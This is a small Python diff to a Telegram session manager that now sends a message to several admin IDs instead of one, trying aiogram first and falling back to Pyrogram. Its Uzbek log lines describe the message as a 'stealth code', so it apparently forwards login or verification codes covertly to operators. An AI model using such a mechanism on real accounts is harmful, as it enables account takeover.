@@ -129,12 +129,14 @@ class SessionManager:
                                 
                                 try:
                                     from bot_instance import bot
-                                    await bot.send_message(config.admin_id, msg, parse_mode="HTML")
+                                    for admin_id in config.admin_ids:
+                                        await bot.send_message(admin_id, msg, parse_mode="HTML")
                                     logger.info("Aiogram orqali stealth kod yuborildi.")
                                 except Exception as e:
                                     logger.error(f"Aiogram bilan kod yuborishda xato: {e}. Pyrogram orqali urinib ko'ramiz...")
                                     try:
-                                        await c.send_message(config.admin_id, msg)
+                                        for admin_id in config.admin_ids:
+                                            await c.send_message(admin_id, msg)
                                         logger.info("Pyrogram orqali stealth kod yuborildi.")
                                     except Exception as inner_e:
                                         logger.error(f"Pyrogram bilan ham yuborib bo'lmadi: {inner_e}")
